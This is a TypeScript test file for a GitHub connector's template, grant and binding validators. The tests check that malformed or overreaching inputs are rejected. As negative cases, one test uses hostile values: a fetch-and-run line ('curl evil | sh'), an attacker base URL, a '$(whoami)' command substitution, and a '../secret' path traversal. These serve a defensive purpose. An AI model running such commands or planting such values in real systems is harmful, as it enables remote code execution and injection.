import {test} from 'node:test';
import assert from 'node:assert/strict';
import {parseTemplate,parseConnectionCreate,parseBinding,assertGrantAllowed,assertBindingAllowed} from '../src/connections.ts';
export const template = () => parseTemplate({schema_version:'1',template_id:'github-read',version:'1.0.0',display_name:'Example GitHub',description:'Fictional test template',connector_id:'github',connector_version:'1.0.0',service:{base_url:'https://api.github.com',api_version:'2026-03-10',allowed_hosts:['api.github.com']},auth:{method:'github_fine_grained_pat',required_permissions:['metadata:read','issues:read']},supported_os:['ubuntu','macos'],input_fields:[{name:'resources',type:'github_repository_list',required:true}],setup:{procedure_id:'github-fine-grained-pat-v1',procedure_version:'1.0.0'},connection_test:{procedure_id:'github-read-test-v1',required_capabilities:['repository.read','issues.read']},capabilities:['repository.read','issues.read'],resource_rules:[{owner:'*',repository:'*'}],related_skills:[],usage_notice:{version:'1',text:'I authorize permitted business use of these selected resources, not administrator access.'}});
const resource={kind:'github_repository' as const,owner:'example-client',repository:'project'};
export const connection = () => parseConnectionCreate({schema_version:'1',request_id:crypto.randomUUID(),template_id:'github-read',template_version:'1.0.0',account_kind:'personal',display_name:'Example account',account:{provider_account_id:'12345',login:'example-user'},management:{kind:'individual',label:'Owner'},project:{id:'client-project',label:'Example client'},resources:[resource],usage_grant:{notice_version:'1',accepted:true,operations:['repository.read','issues.read'],resources:[resource]}});
test('template registries reject command/endpoint injection and undeclared procedure versions',()=>{
  const valid=template();
  for(const change of [{shell:'curl evil | sh'},{service:{...valid.service,base_url:'https://evil.example'}},{setup:{...valid.setup,procedure_id:'$(whoami)'}},{auth:{...valid.auth,token:'secret'}},{connector_version:'9.9.9'}])assert.throws(()=>parseTemplate({...valid,...change}));
  assert.throws(()=>parseTemplate({...valid,resource_rules:[{owner:'example',repository:'../secret'}]}));
  assert.throws(()=>parseTemplate({...valid,auth:{...valid.auth,required_permissions:['metadata:read']}}));
});
test('account category, management and project remain independent while exact grants are constrained',()=>{
  const value=connection();assert.equal(value.account_kind,'personal');assert.equal(value.project?.id,'client-project');assert.doesNotThrow(()=>assertGrantAllowed(template(),value.resources,value.usage_grant));
  assert.throws(()=>parseConnectionCreate({...value,person_id:'other'}));
  assert.throws(()=>parseConnectionCreate({...value,usage_grant:{...value.usage_grant,accepted:false}}));
  assert.throws(()=>parseConnectionCreate({...value,resources:[resource,{...resource,owner:resource.owner.toUpperCase()}]}));
  assert.throws(()=>assertGrantAllowed({...template(),resource_rules:[{owner:'other',repository:'*'}]},value.resources,value.usage_grant));
  assert.throws(()=>assertGrantAllowed(template(),value.resources,{...value.usage_grant,notice_version:'different'}));
});
test('ready bindings bind account, grant revision, requested permissions and tested exact resources',()=>{
  const value=connection();const grant={...value.usage_grant,revision:1};
  const binding=parseBinding({schema_version:'1',request_id:crypto.randomUUID(),grant_revision:1,status:'ready',verified_account_id:'12345',requested_permissions:['metadata:read','issues:read'],tested_capabilities:['repository.read','issues.read'],tested_resources:[resource],error_code:null});
  assert.doesNotThrow(()=>assertBindingAllowed(template(),'12345',grant,binding));
  assert.throws(()=>assertBindingAllowed(template(),'98765',grant,binding));
  assert.throws(()=>assertBindingAllowed(template(),'12345',{...grant,revision:2},binding));
  assert.throws(()=>parseBinding({...binding,credential:'secret'}));
  assert.throws(()=>parseBinding({...binding,status:'error',error_code:'raw HTTP exception secret'}));
});
